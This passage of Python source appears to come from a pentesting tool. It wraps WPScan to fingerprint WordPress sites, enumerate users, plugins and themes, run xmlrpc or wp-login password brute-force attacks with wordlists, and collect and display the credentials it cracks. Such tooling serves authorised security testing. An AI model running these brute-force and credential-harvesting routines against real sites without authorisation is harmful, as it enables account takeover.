        return SECLISTS_PASSWORDS
    if os.path.isfile(ROCKYOU_WORDLIST_GZ):
        print_warning(f"rockyou exists compressed at {ROCKYOU_WORDLIST_GZ}; decompress it to use it with WPScan.")
    return None

def _wpscan_component_version(component):
    if not isinstance(component, dict):
        return ""
    version = component.get("version")
    if isinstance(version, dict):
        return str(version.get("number") or version.get("value") or version.get("version") or "")
    if version is None:
        return ""
    return str(version)

def _wpscan_component_confidence(component):
    if not isinstance(component, dict):
        return ""
    version = component.get("version")
    if isinstance(version, dict) and version.get("confidence") is not None:
        return str(version.get("confidence"))
    if component.get("confidence") is not None:
        return str(component.get("confidence"))
    return ""

def _wpscan_reference_list(vuln):
    refs = []
    raw_refs = vuln.get("references") if isinstance(vuln, dict) else None
    if isinstance(raw_refs, dict):
        for key, value in raw_refs.items():
            values = value if isinstance(value, list) else [value]
            for item in values:
                if item:
                    refs.append(f"{key}:{item}")
    elif isinstance(raw_refs, list):
        refs.extend(str(r) for r in raw_refs if r)
    return refs

def _extract_wpscan_users(data):
    users = []
    raw = data.get("users") if isinstance(data, dict) else None

    def add_user(username, info=None):
        username = str(username or "").strip()
        if not username:
            return
        info = info if isinstance(info, dict) else {}
        users.append({
            "username": username,
            "id": info.get("id"),
            "name": info.get("name") or info.get("display_name") or info.get("display_name_public"),
            "found_by": info.get("found_by") or info.get("found_by_text") or "",
        })

    if isinstance(raw, dict):
        for key, item in raw.items():
            if isinstance(item, dict):
                add_user(item.get("username") or item.get("login") or key, item)
            else:
                add_user(key)
    elif isinstance(raw, list):
        for item in raw:
            if isinstance(item, dict):
                add_user(item.get("username") or item.get("login") or item.get("name"), item)
            else:
                add_user(item)

    deduped = []
    seen = set()
    for user in users:
        key = user["username"].lower()
        if key in seen:
            continue
        seen.add(key)
        deduped.append(user)
    return deduped

def _normalize_wpscan_components(raw_components):
    components = []
    if isinstance(raw_components, dict):
        iterable = raw_components.items()
    elif isinstance(raw_components, list):
        iterable = [(None, item) for item in raw_components]
    else:
        iterable = []
    for slug, item in iterable:
        if not isinstance(item, dict):
            continue
        name = item.get("slug") or item.get("name") or slug or ""
        components.append({
            "name": str(name),
            "location": item.get("location") or "",
            "version": _wpscan_component_version(item),
            "confidence": _wpscan_component_confidence(item),
            "found_by": item.get("found_by") or item.get("found_by_text") or "",
            "latest_version": item.get("latest_version") or "",
            "last_updated": item.get("last_updated") or "",
            "vulnerabilities_count": len(item.get("vulnerabilities") or []),
        })
    return components

def _extract_wpscan_vulnerabilities(data):
    vulnerabilities = []

    def add_vulns(component_type, component_name, raw_vulns):
        if not raw_vulns:
            return
        for vuln in raw_vulns:
            if isinstance(vuln, dict):
                title = vuln.get("title") or vuln.get("name") or vuln.get("id") or "WPScan Vulnerability"
                fixed_in = vuln.get("fixed_in")
                if isinstance(fixed_in, list):
                    fixed_in = ", ".join(str(x) for x in fixed_in)
                vulnerabilities.append({
                    "component_type": component_type,
                    "component": component_name,
                    "title": str(title),
                    "fixed_in": str(fixed_in or ""),
                    "references": _wpscan_reference_list(vuln),
                })
            else:
                vulnerabilities.append({
                    "component_type": component_type,
                    "component": component_name,
                    "title": str(vuln),
                    "fixed_in": "",
                    "references": [],
                })

    version = data.get("version") if isinstance(data, dict) else {}
    if isinstance(version, dict):
        core_name = "WordPress"
        if version.get("number"):
            core_name = f"WordPress {version.get('number')}"
        add_vulns("core", core_name, version.get("vulnerabilities"))

    main_theme = data.get("main_theme") if isinstance(data, dict) else {}
    if isinstance(main_theme, dict):
        add_vulns("theme", main_theme.get("slug") or main_theme.get("name") or "main_theme", main_theme.get("vulnerabilities"))

    for collection_name, component_type in (("plugins", "plugin"), ("themes", "theme")):
        raw_components = data.get(collection_name) if isinstance(data, dict) else {}
        if isinstance(raw_components, dict):
            for slug, item in raw_components.items():
                if isinstance(item, dict):
                    add_vulns(component_type, item.get("slug") or item.get("name") or slug, item.get("vulnerabilities"))

    add_vulns("wordpress", "general", data.get("vulnerabilities") if isinstance(data, dict) else None)
    return vulnerabilities

def _normalize_wpscan_scan(data, target):
    if not isinstance(data, dict):
        data = {}
    version_raw = data.get("version") if isinstance(data.get("version"), dict) else {}
    plugins = _normalize_wpscan_components(data.get("plugins") or {})
    themes = _normalize_wpscan_components(data.get("themes") or {})
    main_theme_raw = data.get("main_theme") if isinstance(data.get("main_theme"), dict) else {}
    main_theme = {}
    if main_theme_raw:
        main_theme = {
            "name": main_theme_raw.get("slug") or main_theme_raw.get("name") or "",
            "location": main_theme_raw.get("location") or "",
            "version": _wpscan_component_version(main_theme_raw),
            "confidence": _wpscan_component_confidence(main_theme_raw),
            "found_by": main_theme_raw.get("found_by") or main_theme_raw.get("found_by_text") or "",
            "latest_version": main_theme_raw.get("latest_version") or "",
            "last_updated": main_theme_raw.get("last_updated") or "",
            "vulnerabilities_count": len(main_theme_raw.get("vulnerabilities") or []),
        }
    users = _extract_wpscan_users(data)
    vulnerabilities = _extract_wpscan_vulnerabilities(data)
    interesting = []
    for item in data.get("interesting_findings") or []:
        if isinstance(item, dict):
            interesting.append({
                "type": item.get("type") or "",
                "url": item.get("url") or "",
                "to_s": item.get("to_s") or item.get("interesting_entry") or item.get("type") or "",
                "confidence": item.get("confidence"),
            })
        else:
            interesting.append({"type": "", "url": "", "to_s": str(item), "confidence": None})

    detected = bool(version_raw or plugins or themes or main_theme or users or interesting)
    return {
        "target": target,
        "detected": detected,
        "version": {
            "number": version_raw.get("number") or "",
            "status": version_raw.get("status") or "",
            "found_by": version_raw.get("found_by") or "",
        },
        "main_theme": main_theme,
        "plugins": plugins,
        "themes": themes,
        "users": users,
        "interesting_findings": interesting,
        "vulnerabilities": vulnerabilities,
        "credentials": [],
        "bruteforce": {},
    }

def _extract_wpscan_credentials(data, stdout_text=""):
    credentials = set()
    stdout_text = _ANSI_RE.sub("", stdout_text or "")

    def add(user, pwd):
        user = str(user or "").strip()
        pwd = str(pwd or "").strip()
        if user and pwd and len(user) <= 128 and len(pwd) <= 256:
            credentials.add((user, pwd))

    for match in re.finditer(r"\[SUCCESS\]\s*-\s*([^\s/]+)\s*/\s*([^\r\n]+)", stdout_text or "", re.I):
        add(match.group(1), match.group(2))
    for match in re.finditer(r"Username:\s*([^,\s]+)\s*,\s*Password:\s*(\S+)", stdout_text or "", re.I):
        add(match.group(1), match.group(2))

    def walk(obj):
        if isinstance(obj, dict):
            user = obj.get("username") or obj.get("login") or obj.get("user")
            pwd = obj.get("password") or obj.get("pass")
            if user and pwd:
                add(user, pwd)
            for value in obj.values():
                walk(value)
        elif isinstance(obj, list):
            for item in obj:
                walk(item)

    walk(data)
    return [{"username": u, "password": p, "source": "wpscan"} for u, p in sorted(credentials)]

def _merge_credentials(global_key, credentials):
    current = SCAN_DATA.get(global_key) or []
    seen = set()
    merged = []
    for item in list(current) + list(credentials or []):
        if not isinstance(item, dict):
            continue
        key = (item.get("username"), item.get("password"))
        if not key[0] or not key[1] or key in seen:
            continue
        seen.add(key)
        merged.append(item)
    SCAN_DATA[global_key] = merged
    return merged

def _append_wpscan_common_options(cmd, session, api_token=None):
    if api_token:
        cmd += ["--api-token", api_token]
    cookie_string = _session_cookie_string(session)
    if cookie_string:
        cmd += ["--cookie-string", cookie_string]
    user_agent = _session_header_value(session, "User-Agent")
    if user_agent:
        cmd += ["--user-agent", user_agent]
    if not VERIFY_TLS and "--disable-tls-checks" not in cmd:
        cmd += ["--disable-tls-checks"]
    return cmd

def _wpscan_retry_command(cmd, request_timeout=None):
    retry_cmd = list(cmd)
    for flag in ("--disable-tls-checks", "--random-user-agent", "--follow-redirection"):
        if flag not in retry_cmd:
            retry_cmd.append(flag)
    if request_timeout is not None:
        if "--request-timeout" in retry_cmd:
            idx = retry_cmd.index("--request-timeout")
            if idx + 1 < len(retry_cmd):
                retry_cmd[idx + 1] = str(max(30, int(request_timeout or 15)))
        else:
            retry_cmd += ["--request-timeout", str(max(30, int(request_timeout or 15)))]
    return retry_cmd

def _run_wpscan_visible(cmd, request_timeout=None, label="WPScan"):
    print_info(f"Running {label} with native output: {_format_external_command(cmd)}")
    rc, stdout_text = _stream_command_output(cmd, capture=True, prefer_pty=True, interrupt_label="wpscan")
    if rc == 4:
        print_warning("WPScan returned code 4; retrying with more tolerant options.")
        retry_cmd = _wpscan_retry_command(cmd, request_timeout=request_timeout)
        print_info(f"Reintentando {label}: {_format_external_command(retry_cmd)}")
        rc2, out2 = _stream_command_output(retry_cmd, capture=True, prefer_pty=True, interrupt_label="wpscan")
        if out2:
            stdout_text = out2
        rc = rc2
    return rc, stdout_text

def _run_wpscan_json(cmd, request_timeout=None):
    print_info("Generating WPScan JSON to build the final summary...")
    rc, stdout_text = _capture_command_output(cmd, interrupt_label="wpscan")
    if rc == 4:
        print_warning("WPScan returned code 4 while generating JSON; retrying with more tolerant options.")
        retry_cmd = _wpscan_retry_command(cmd, request_timeout=request_timeout)
        rc2, out2 = _capture_command_output(retry_cmd, interrupt_label="wpscan")
        if out2:
            stdout_text = out2
        rc = rc2
    return rc, stdout_text

def _wpscan_was_interrupted(return_code):
    return return_code is None or return_code in (130, -2, -15)

def run_wpscan_enumeration(target, session, wpscan_path, api_token=None, threads=5, request_timeout=15,
                           enum_flags="u,ap,at", label="WPScan enumeration"):
    tmp_fd, tmp_path = tempfile.mkstemp(suffix=".json", prefix="wpscan_enum_")
    os.close(tmp_fd)
    # Use explicit enumerate to avoid ambiguity across WPScan versions
    enum_flags = str(enum_flags or "u,ap,at").strip() or "u,ap,at"
    base_cmd = [
        wpscan_path,
        "--url", target,
        "--enumerate", enum_flags,
        "--request-timeout", str(max(5, int(request_timeout or 15))),
        "-t", str(max(1, int(threads or 5))),
    ]

    visible_cmd = _append_wpscan_common_options(list(base_cmd) + ["--format", "cli"], session, api_token=api_token)
    json_cmd = _append_wpscan_common_options(
        list(base_cmd) + ["--format", "json", "--output", tmp_path, "--no-banner"],
        session,
        api_token=api_token,
    )

    display_rc, stdout_text = _run_wpscan_visible(
        visible_cmd,
        request_timeout=request_timeout,
        label=label,
    )

    json_rc = None
    json_stdout = ""
    interrupted = _wpscan_was_interrupted(display_rc)
    if not interrupted:
        json_rc, json_stdout = _run_wpscan_json(json_cmd, request_timeout=request_timeout)
    else:
        print_info("WPScan interrupted. Skipping JSON generation to return to the menu immediately.")

    data = _load_json_file(tmp_path)
    try:
        os.unlink(tmp_path)
    except Exception:
        pass

    scan = _normalize_wpscan_scan(data, target)
    scan["command"] = _format_external_command(visible_cmd)
    scan["json_command"] = _format_external_command(json_cmd)
    scan["return_code"] = json_rc if json_rc is not None else display_rc
    scan["display_return_code"] = display_rc
    scan["json_return_code"] = json_rc
    scan["interrupted"] = interrupted
    scan["stdout_tail"] = stdout_text[-4000:] if stdout_text else ""
    scan["json_stdout_tail"] = json_stdout[-4000:] if json_stdout else ""
    if not scan["interrupted"] and scan["return_code"] not in (0, None):
        print_warning(f"WPScan finished with code {scan['return_code']}. Saving whatever could be parsed.")
    return scan

def run_wpscan_bruteforce(target, session, wpscan_path, users, passlist, api_token=None,
                          threads=20, attack_mode="xmlrpc"):
    result = {
        "attack_mode": attack_mode,
        "users": list(users or []),
        "password_wordlist": passlist,
        "credentials": [],
        "return_code": None,
    }
    if not users or not passlist or not os.path.isfile(passlist):
        print_warning("No users or valid wordlist for WordPress bruteforce.")
        return result

    user_fd, user_path = tempfile.mkstemp(suffix=".txt", prefix="wpscan_users_")
    os.close(user_fd)
    with open(user_path, "w", encoding="utf-8") as f:
        for user in users:
            f.write(str(user).strip() + "\n")

    cmd = [
        wpscan_path,
        "--url", target,
        "--password-attack", attack_mode,
        "-t", str(max(1, int(threads or 20))),
        "-U", user_path,
        "-P", passlist,
        "--format", "cli",
    ]
    cmd = _append_wpscan_common_options(cmd, session, api_token=api_token)

    stdout_text = ""
    try:
        rc, stdout_text = _run_wpscan_visible(cmd, label="WPScan bruteforce")
        result["return_code"] = rc
        result["credentials"] = _extract_wpscan_credentials({}, stdout_text)
        result["command"] = _format_external_command(cmd)
        result["stdout_tail"] = stdout_text[-4000:] if stdout_text else ""
    finally:
        try:
            os.unlink(user_path)
        except Exception:
            pass

    if result["return_code"] not in (0, None):
        print_warning(f"WPScan bruteforce finished with status {result['return_code']}.")
    if result["credentials"]:
        rows = [[f"{Fore.MAGENTA}{c['username']}{Style.RESET_ALL}",
                 f"{Fore.MAGENTA}{c['password']}{Style.RESET_ALL}"]
                for c in result["credentials"]]
        print_table(headers=["USER", "PASSWORD"], rows=rows, title="Valid WordPress credentials:")
    else:
        print_info("WPScan reportd no valid credentials.")
    return result

def _wp_summary_value(value, width=90):
    if value is None or value == "":
        return "-"
    text = re.sub(r"\s+", " ", str(value)).strip()
    return text if len(text) <= width else text[: max(0, width - 3)] + "..."

def _wp_component_rows(components):
    rows = []
    for item in components or []:
        if not isinstance(item, dict):
            continue
        try:
            vuln_count = int(item.get("vulnerabilities_count") or 0)
        except Exception:
            vuln_count = 0
        vuln_text = f"{Fore.RED}{vuln_count}{Style.RESET_ALL}" if vuln_count else "0"
        rows.append([
            _wp_summary_value(item.get("name"), 34),
            _wp_summary_value(item.get("version"), 18),
            _wp_summary_value(item.get("latest_version"), 18),
            _wp_summary_value(item.get("confidence"), 8),
            vuln_text,
            _wp_summary_value(item.get("location"), 72),
        ])
    return rows

def print_wpscan_detailed_summary(scan):
    scan = scan or {}
    version = scan.get("version") or {}
    main_theme = scan.get("main_theme") or {}
    plugins = scan.get("plugins") or []
    themes = list(scan.get("themes") or [])
    users = scan.get("users") or []
    vulnerabilities = scan.get("vulnerabilities") or []
    credentials = scan.get("credentials") or []
    interesting = scan.get("interesting_findings") or []

    print_phase("SUMMARY WORDPRESS / WPSCAN")
    core_rows = [
        ["Target", _wp_summary_value(scan.get("target"), 90)],
        ["Detected", "Yes" if scan.get("detected") else "Not confirmed"],
        ["WordPress version", _wp_summary_value(version.get("number"))],
        ["Version status", _wp_summary_value(version.get("status"))],
        ["Version found by", _wp_summary_value(version.get("found_by"), 90)],
        ["Main theme", _wp_summary_value(main_theme.get("name"))],
        ["Plugins found", str(len(plugins))],
        ["Themes found", str(len(themes) + (1 if main_theme else 0))],
        ["Users found", str(len(users))],
        ["Vulnerabilities", str(len(vulnerabilities))],
        ["Valid credentials", str(len(credentials))],
    ]
    print_table(headers=["Field", "Value"], rows=core_rows, title="General WordPress summary:")

    if plugins:
        print_table(
            headers=["Plugin", "Version", "Ultima", "Conf.", "Vulns", "Ubicacion"],
            rows=_wp_component_rows(plugins),
            alignments=['<', '<', '<', '>', '>', '<'],
            title=f"WordPress plugins found ({len(plugins)}):",
        )
    else:
        print_info("WPScan no reporto plugins.")

    theme_items = []
    seen_themes = set()
    if main_theme:
        item = dict(main_theme)
        item["name"] = f"{item.get('name') or '-'} (principal)"
        theme_items.append(item)
        seen_themes.add((str(main_theme.get("name") or "").lower(), str(main_theme.get("location") or "").lower()))
    for theme in themes:
        if not isinstance(theme, dict):
            continue
        key = (str(theme.get("name") or "").lower(), str(theme.get("location") or "").lower())
        if key in seen_themes:
            continue
        seen_themes.add(key)
        theme_items.append(theme)
    if theme_items:
        print_table(
            headers=["Theme", "Version", "Ultima", "Conf.", "Vulns", "Ubicacion"],
            rows=_wp_component_rows(theme_items),
            alignments=['<', '<', '<', '>', '>', '<'],
            title=f"WordPress themes found ({len(theme_items)}):",
        )
    else:
        print_info("WPScan no reporto temas.")

    if users:
        user_rows = [
            [
                _wp_summary_value(u.get("username"), 32),
                _wp_summary_value(u.get("id"), 8),
                _wp_summary_value(u.get("name"), 34),
                _wp_summary_value(u.get("found_by"), 72),
            ]
            for u in users if isinstance(u, dict)
        ]
        print_table(
            headers=["User", "ID", "Name", "Found by"],
            rows=user_rows,
            alignments=['<', '<', '<', '<'],
            title=f"WordPress users found ({len(user_rows)}):",
        )
    else:
        print_info("WPScan no reporto users.")

    if interesting:
        interesting_rows = [
            [
                _wp_summary_value(i.get("type"), 24),
                _wp_summary_value(i.get("to_s"), 84),
                _wp_summary_value(i.get("url"), 84),
                _wp_summary_value(i.get("confidence"), 8),
            ]
            for i in interesting if isinstance(i, dict)
        ]
        print_table(
            headers=["Type", "Detail", "URL", "Conf."],
            rows=interesting_rows,
            alignments=['<', '<', '<', '>'],
            title=f"Findings interestings WordPress ({len(interesting_rows)}):",
        )

    if vulnerabilities:
        vuln_rows = []
        for vuln in vulnerabilities:
            if not isinstance(vuln, dict):
                continue
            refs = ", ".join(vuln.get("references") or [])
            vuln_rows.append([
                _wp_summary_value(vuln.get("component_type"), 14),
                _wp_summary_value(vuln.get("component"), 30),
                _wp_summary_value(vuln.get("title"), 80),
                _wp_summary_value(vuln.get("fixed_in"), 18),
                _wp_summary_value(refs, 70),
            ])
        print_table(
            headers=["Type", "Component", "Title", "Fixed in", "Referencias"],
            rows=vuln_rows,
            alignments=['<', '<', '<', '<', '<'],
            title=f"Vulnerabilities WordPress ({len(vuln_rows)}):",
        )
    else:
        print_info("WPScan reportd no vulnerabilities.")

    if credentials:
        cred_rows = [
            [
                f"{Fore.MAGENTA}{_wp_summary_value(c.get('username'), 32)}{Style.RESET_ALL}",
                f"{Fore.MAGENTA}{_wp_summary_value(c.get('password'), 40)}{Style.RESET_ALL}",
                _wp_summary_value(c.get("source") or "wpscan", 16),
            ]
            for c in credentials if isinstance(c, dict)
        ]
        print_table(
            headers=["User", "Password", "Source"],
            rows=cred_rows,
            alignments=['<', '<', '<'],
            title=f"Valid WordPress credentials ({len(cred_rows)}):",
            border_color=Fore.GREEN,
        )

def _technology_to_text(item):
    if isinstance(item, dict):
        return " ".join(str(item.get(k) or "") for k in ("name", "detail", "version", "value"))
    return str(item or "")

def _whatweb_detects_wordpress(technologies):
    matches = []
    for item in technologies or []:
        text = _technology_to_text(item).strip()
        if not text:
            continue
        if re.search(r"\bwordpress\b", text, re.I):
            matches.append(text)
    return bool(matches), matches

def _manual_wordpress_signal(signals, name, evidence, source):
    evidence = str(evidence or "").strip()
    key = (name, evidence[:160], source)
    for item in signals:
        if item.get("key") == key:
            return
    signals.append({
        "key": key,
        "name": name,
        "evidence": evidence[:240],
        "source": source,
    })

def _scan_text_for_wordpress_patterns(text, source, signals):
    if not text:
        return
    patterns = [
        ("meta generator", r'<meta[^>]+name=["\']generator["\'][^>]+content=["\'][^"\']*wordpress[^"\']*["\']'),
        ("wp-content", r'/(?:wp-content)/(?:plugins|themes|uploads)/[^"\'<>\s]+'),
        ("wp-includes", r'/(?:wp-includes)/[^"\'<>\s]+'),
        ("wp-json", r'(?:/wp-json/|rest_route=/?wp/|wp/v2)'),
        ("wp assets", r'(?:wp-emoji-release|wp-block-library|wp-polyfill|wp-embed|wpApiSettings)'),
        ("wordpress text", r'\bWordPress\b'),
    ]
    for name, pattern in patterns:
        match = re.search(pattern, text, re.I)
        if match:
            _manual_wordpress_signal(signals, name, match.group(0), source)

def _manual_wordpress_detection(target, session):
    signals = []
    checked_urls = []

    def fetch(url, method="GET"):
        checked_urls.append(url)
        try:
            if method == "HEAD":
                return session.head(url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
            return session.get(url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
        except Exception:
            return None

    resp = fetch(target)
    if resp is not None:
        _scan_text_for_wordpress_patterns(resp.text or "", "html", signals)
        header_text = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
        _scan_text_for_wordpress_patterns(header_text, "headers", signals)
        if "xmlrpc.php" in str(resp.headers.get("X-Pingback", "")).lower():
            _manual_wordpress_signal(signals, "x-pingback", resp.headers.get("X-Pingback"), "headers")

    relative_base = target if str(target).endswith("/") else f"{target}/"
    raw_probes = [
        (urljoin(relative_base, "wp-login.php"), "login"),
        (urljoin(target, "/wp-login.php"), "login"),
        (urljoin(relative_base, "wp-json/"), "rest api"),
        (urljoin(target, "/wp-json/"), "rest api"),
        (urljoin(relative_base, "xmlrpc.php"), "xmlrpc"),
        (urljoin(target, "/xmlrpc.php"), "xmlrpc"),
    ]
    probes = []
    seen_probe_urls = set()
    for url, probe_type in raw_probes:
        if url in seen_probe_urls:
            continue
        seen_probe_urls.add(url)
        probes.append((url, probe_type))
    for url, probe_type in probes:
        probe_resp = fetch(url)
        if probe_resp is None:
            continue
        body = probe_resp.text or ""
        body_low = body.lower()
        if probe_type == "login" and probe_resp.status_code < 500:
            if "wp-submit" in body_low or "wordpress" in body_low or "wp-login.php" in body_low:
                _manual_wordpress_signal(signals, "wp-login.php", f"HTTP {probe_resp.status_code}", url)
        elif probe_type == "rest api" and probe_resp.status_code < 500:
            if "wp/v2" in body_low or '"namespaces"' in body_low or '"routes"' in body_low:
                _manual_wordpress_signal(signals, "wp-json api", f"HTTP {probe_resp.status_code}", url)
        elif probe_type == "xmlrpc" and probe_resp.status_code in (200, 405):
            if "xml-rpc server accepts post requests only" in body_low or "xmlrpc" in body_low:
                _manual_wordpress_signal(signals, "xmlrpc.php", f"HTTP {probe_resp.status_code}", url)

    for item in signals:
        item.pop("key", None)
    strong_signals = [s for s in signals if s.get("name") != "wordpress text"]
    return {
        "detected": bool(strong_signals) or len(signals) >= 2,
        "source": "manual",
        "signals": signals,
        "checked_urls": checked_urls,
    }

def detect_wordpress_for_full_pentest(target, session):
    general = SCAN_DATA.get("general") or {}
    technologies = general.get("technologies") or []
    tech_source = general.get("technologies_source") or "unknown"

    if tech_source == "whatweb":
        detected, matches = _whatweb_detects_wordpress(technologies)
        if detected:
            detection = {
                "detected": True,
                "source": "whatweb",
                "matches": matches,
            }
            SCAN_DATA["wordpress_detection"] = detection
            print_good(f"WhatWeb detecto WordPress: {', '.join(matches[:3])}")
            return detection
        print_info("WhatWeb did not detect WordPress. Running manual pattern-based detection.")
    else:
        print_info("No useful WhatWeb detection for WordPress. Running manual pattern-based detection.")

    detection = _manual_wordpress_detection(target, session)
    SCAN_DATA["wordpress_detection"] = detection
    if detection.get("detected"):
        signal_names = sorted({s.get("name", "") for s in detection.get("signals", []) if s.get("name")})
        print_good(f"Manual detection compatible with WordPress: {', '.join(signal_names[:5])}")
    else:
        print_info("No se encontraron patrones manuales suficientes de WordPress.")
    return detection

def run_wordpress_attacks_if_detected(target, session):
    detection = detect_wordpress_for_full_pentest(target, session)
    if not detection.get("detected"):
        print_info("Target no identificado como WordPress. Saltando WPScan en pentesting completo.")
        return None
    return run_wordpress_attacks(target, session)

def run_wpscan_user_enumeration_if_wordpress(target, session, existing_users=None):
    existing_users = list(existing_users or [])
    detection = detect_wordpress_for_full_pentest(target, session)
    if not detection.get("detected"):
        print_info("Target not identified as WordPress. Keeping the usual user enumeration.")
        return existing_users

    wpscan_path = check_wpscan()
    if not wpscan_path:
        if not install_wpscan():
            print_warning("WPScan unavailable. Keeping only the usual user enumeration.")
            return existing_users
        wpscan_path = check_wpscan()
        if not wpscan_path:
            print_warning("WPScan is still not available.")
            return existing_users

    api_token = os.environ.get("WPSCAN_API_TOKEN") or os.environ.get("WPVULNDB_API_TOKEN") or ""
    if api_token:
        print_info("Using token API de WPScan/WPVulnDB desde variable de entorno.")

    scan = run_wpscan_enumeration(
        target,
        session,
        wpscan_path,
        api_token=api_token,
        threads=max(5, THREADS),
        request_timeout=max(15, DEFAULT_TIMEOUT),
        enum_flags="u",
        label="WPScan enumeration de users",
    )
    SCAN_DATA["wordpress"] = scan
    if scan.get("interrupted"):
        print_info("WPScan enumeration interrupted. Continuing with users found by the usual methods.")
        return existing_users

    wp_users = [u.get("username") for u in scan.get("users") or [] if isinstance(u, dict) and u.get("username")]
    if wp_users:
        merged_users = sorted(set(existing_users + wp_users))
        SCAN_DATA["users"] = merged_users
        for user in wp_users:
            _append_finding_once(f"[WP:USER] {user}")
        print_table(
            headers=["User"],
            rows=[[u] for u in wp_users],
            title=f"WordPress users identified with WPScan ({len(wp_users)}):",
        )
        return merged_users

    print_info("WPScan no identifico users WordPress adicionales.")
    return existing_users

def run_wordpress_attacks(target, session):
    print_phase("WORDPRESS ENUMERATION AND ATTACKS")
    wpscan_path = check_wpscan()
    if not wpscan_path:
        if not install_wpscan():
            print_warning("Saltando WordPress/WPScan.")
            return None
        wpscan_path = check_wpscan()
        if not wpscan_path:
            print_warning("WPScan is still not available.")
            return None

    api_token = os.environ.get("WPSCAN_API_TOKEN") or os.environ.get("WPVULNDB_API_TOKEN") or ""
    if api_token:
        print_info("Using token API de WPScan/WPVulnDB desde variable de entorno.")
    else:
        try:
            print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} WPVulnDB/WPScan API token (optional, Enter to skip):")
            api_token = getpass.getpass("> ").strip()
        except (KeyboardInterrupt, EOFError):
            api_token = ""

    enum_threads = max(5, THREADS)
    scan = run_wpscan_enumeration(target, session, wpscan_path, api_token=api_token, threads=enum_threads, request_timeout=max(15, DEFAULT_TIMEOUT))
    SCAN_DATA["wordpress"] = scan
    if scan.get("interrupted"):
        print_info("Enumeracion WPScan interrumpida. Volviendo al flujo principal.")
        return scan

    version = scan.get("version") or {}
    users = [u.get("username") for u in scan.get("users") or [] if u.get("username")]
    vulnerabilities = scan.get("vulnerabilities") or []
    plugins = scan.get("plugins") or []
    main_theme = scan.get("main_theme") or {}

    if not scan.get("detected"):
        print_warning("WPScan did not confirm that the target is WordPress.")
    else:
        summary_rows = [
            ["WordPress", version.get("number") or "detected"],
            ["Version status", version.get("status") or "-"],
            ["Main theme", main_theme.get("name") or "-"],
            ["Plugins detected", str(len(plugins))],
            ["Users", str(len(users))],
            ["Vulnerabilities", str(len(vulnerabilities))],
        ]
        print_table(headers=["Field", "Value"], rows=summary_rows, title="Summary WordPress:")

    if version.get("number"):
        _append_finding_once(f"[WP] WordPress {version.get('number')} ({version.get('status') or 'unknown status'})")
    for plugin in plugins:
        if isinstance(plugin, dict) and plugin.get("name"):
            _append_finding_once(f"[WP:PLUGIN] {plugin.get('name')} {plugin.get('version') or 'unknown version'}")
    if main_theme.get("name"):
        _append_finding_once(f"[WP:THEME] {main_theme.get('name')} {main_theme.get('version') or 'unknown version'}")
    for theme in scan.get("themes") or []:
        if isinstance(theme, dict) and theme.get("name"):
            _append_finding_once(f"[WP:THEME] {theme.get('name')} {theme.get('version') or 'unknown version'}")
    for user in users:
        _append_finding_once(f"[WP:USER] {user}")
    for vuln in vulnerabilities:
        _append_finding_once(
            f"[WP:VULN] {vuln.get('component_type')}:{vuln.get('component')} - {vuln.get('title')}"
        )

    if users:
        SCAN_DATA["users"] = sorted(set((SCAN_DATA.get("users") or []) + users))
        user_rows = [[u] for u in users]
        print_table(headers=["User"], rows=user_rows, title="Users WordPress identificados:")

        try:
            print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Run WPScan brute force against these users? [Y/n]:")
            do_brute = input("> ").strip().lower() != 'n'
        except (KeyboardInterrupt, EOFError):
            do_brute = False
        if do_brute:
            passlist = input_path(
                "Password wordlist path (Enter = rockyou/SecLists if present): "
            ).strip()
            if not passlist:
                passlist = _default_wordpress_password_wordlist()
                if passlist:
                    print_info(f"Using default wordlist: {passlist}")
            if not passlist or not os.path.isfile(passlist):
                print_warning("No valid password wordlist. Skipping WordPress bruteforce.")
            else:
                try:
                    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Attack method [xmlrpc/wp-login] (default xmlrpc):")
                    mode_in = input("> ").strip().lower()
                except (KeyboardInterrupt, EOFError):
                    mode_in = ""
                attack_mode = mode_in if mode_in in ("xmlrpc", "wp-login") else "xmlrpc"
                brute = run_wpscan_bruteforce(
                    target, session, wpscan_path, users, passlist,
                    api_token=api_token, threads=max(20, THREADS),
                    attack_mode=attack_mode,
                )
                scan["bruteforce"] = brute
                scan["credentials"] = brute.get("credentials", [])
                if brute.get("credentials"):
                    _merge_credentials("bruteforce_credentials", brute["credentials"])
                    for cred in brute["credentials"]:
                        _append_finding_once(f"[CRED:WP] {cred.get('username')}:{cred.get('password')}")
    else:
        print_info("WPScan did not identify users; automatic brute force is skipped.")

    SCAN_DATA["wordpress"] = scan
    print_wpscan_detailed_summary(scan)
    return scan

def spider_website(target, session, max_pages=500, max_depth=3, use_robots=True):
    print_info(f"Starting spidering on {target} (max pages: {max_pages}, depth: {max_depth})")
    base_parsed = urlparse(target)
    base_domain = base_parsed.netloc

    robots_parser = None
    if use_robots:
        robots_url = urljoin(target, "/robots.txt")
        try:
            rp = RobotFileParser()
            rp.set_url(robots_url)
            rp.read()
            robots_parser = rp
            print_info("robots.txt cargado correctamente.")
        except (OSError, ValueError) as e:
            print_warning(f"Could not load robots.txt ({type(e).__name__}: {e}). Continuing without restrictions.")

    visited = set()
    urls_queue = deque()
    urls_queue.append((target, 0))
    discovered_urls = set()
    all_params = set()
    forms_found = []
    form_keys_seen = set()
    discovered_urls.add(target)
    
    with tqdm(total=max_pages, desc="Spidering", unit="pg", ncols=80, disable=not HAS_TQDM) as pbar:
        while urls_queue and len(visited) < max_pages:
            current_url, depth = urls_queue.popleft()
            if current_url in visited:
                continue
            if depth > max_depth:
                continue
            visited.add(current_url)
            if HAS_TQDM:
                pbar.update(1)
                pbar.set_postfix({"Actual": os.path.basename(current_url)[:30], "Desc": len(discovered_urls)})
            else:
                if len(visited) % 20 == 0:
                    print_info(f"Spidering progress: {len(visited)} pages visited, {len(discovered_urls)} URLs discovered")
            
            try:
                try:
                    resp = session.get(current_url, timeout=DEFAULT_TIMEOUT)
                except requests.exceptions.TooManyRedirects:
                    # Retry without following redirects to capture the destination
                    try:
                        resp = session.get(current_url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                    except Exception:
                        continue
                if resp.status_code != 200:
                    continue
                content_type = resp.headers.get('Content-Type', '')
                if 'text/html' not in content_type:
                    continue
                
                if HAS_BS4:
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    for link in soup.find_all('a', href=True):
                        href = link['href'].strip()
